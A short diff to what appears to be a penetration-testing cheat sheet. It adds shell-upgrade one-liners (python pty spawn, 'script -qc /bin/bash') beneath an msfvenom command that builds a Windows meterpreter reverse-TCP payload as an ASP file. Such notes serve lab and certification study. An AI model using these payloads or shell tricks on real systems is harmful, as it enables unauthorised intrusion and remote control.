@@ -30,6 +30,12 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f asp > msfshe
 ```
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+```
+/usr/bin/script -qc /bin/bash /dev/null
+```
 
 ## WAR
 
